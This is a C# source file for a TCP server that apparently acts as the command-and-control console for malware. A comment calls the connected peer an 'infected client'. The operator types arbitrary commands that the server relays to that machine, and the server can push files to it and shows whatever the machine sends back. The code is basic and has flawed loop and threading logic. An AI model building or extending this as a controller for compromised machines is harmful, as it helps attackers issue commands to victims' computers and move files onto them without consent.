using System;
using System.Threading.Tasks;
using System.Threading;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
namespace Client
{
    class Server
    {
            
            private TcpListener tcpListener;
            private Thread listenThread;
            private static TcpClient client;

            public Server(string ip, int port)
            {
                Console.WriteLine("Server Starting ....");
                IPAddress IpAdr = IPAddress.Parse(ip);
                this.tcpListener = new TcpListener(IpAdr, port);
                this.listenThread = new Thread(new ThreadStart(ListenForClients));
                this.listenThread.Start();
            }

            private void ListenForClients()
            {
                this.tcpListener.Start();

                while (true)
                {
                    //blocks until a client has connected to the server
                    client = this.tcpListener.AcceptTcpClient();
                    Console.WriteLine("User connected");
                    Thread clientReceiver = new Thread(Receiver);
                    clientReceiver.Start();
                }
            }

            public void Receiver()
            {
                while (true)
                {
                    NetworkStream clientStream = client.GetStream();
                    byte[] _receivdata = new byte[4096];
                    ASCIIEncoding encoder = new ASCIIEncoding();
                    int bytesRead = 0;
                    ///////////////////////////////////
                    ///////Wait return from Client:AkA.infected client
                    try
                    {
                        //blocks until a client sends a message
                        bytesRead = clientStream.Read(_receivdata, 0, 4096);
                    }
                    catch
                    {
                        //a socket error has occured
                        Console.WriteLine("Socket Error");
                    }

                    if (bytesRead == 0)
                    {
                        //the client has disconnected from the server
                        Console.WriteLine("Client Disconnected ...");
                    }

                    //message has successfully been received
                    string ReceivData = encoder.GetString(_receivdata, 0, bytesRead);
                    Console.WriteLine("Client : " + ReceivData);
                }
 
            }

            public static void MsgStart()
            {
                try
                {
                    NetworkStream clientStream = client.GetStream();
                    ASCIIEncoding encoder = new ASCIIEncoding();
                    bool x = true;
                    string C;
                    while (x)
                    {
                        C = Console.ReadLine();
                        if (C == "ConnectionClose" || C == "ConnectionRetry")
                        {
                            byte[] buffer = encoder.GetBytes(C);
                            clientStream.Write(buffer, 0, buffer.Length);
                            clientStream.Flush();
                            Console.WriteLine("Disconnecting ...");
                            client.GetStream().Close();
                            client.Close();
                            x = false;
                        }
                        else
                        {
                            if (C == "/Exit") { x = false; }
                            else
                            {
                                byte[] buffer = encoder.GetBytes(C);
                                clientStream.Write(buffer, 0, buffer.Length);
                                clientStream.Flush();
                            };

                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error : Msg Crash");
                }

            }

            public static void FileSending(string file_path)
            {
                NetworkStream clientStream = client.GetStream();
                ASCIIEncoding encoder = new ASCIIEncoding();
                byte[] KeysByte;

                KeysByte = encoder.GetBytes("/FileSend");
                clientStream.Write(KeysByte, 0, KeysByte.Length);
                Thread.Sleep(250);
                try
                    {

                        /* File reading operation. */
                        Console.WriteLine("Buffering ...");
                        /* Read & store file byte data in byte array. */
                        int BufferSize = 4096;
                        byte[] SendingBuffer = null;
                        FileStream Fs = new FileStream(file_path, FileMode.Open, FileAccess.Read);
                        int TotalLength = (int)Fs.Length, CurrentPacketLength;
                        int NoOfPackets = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(Fs.Length) / Convert.ToDouble(BufferSize)));
                        for (int i = 0; i < NoOfPackets; i++)
                         {
                             if (TotalLength > BufferSize)
                             {
                                 CurrentPacketLength = BufferSize;
                                 TotalLength = TotalLength - CurrentPacketLength;
                             }
                             else
                                 CurrentPacketLength = TotalLength;
                                 SendingBuffer = new byte[CurrentPacketLength];
                                 Fs.Read(SendingBuffer, 0, CurrentPacketLength);
                                 clientStream.Write(SendingBuffer, 0, (int)SendingBuffer.Length);
                             }
                
                            Console.WriteLine("Sent " + Fs.Length.ToString()+"bytes to the server");
                             Fs.Close();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                Console.Write(" Done");
            }
            


    }
}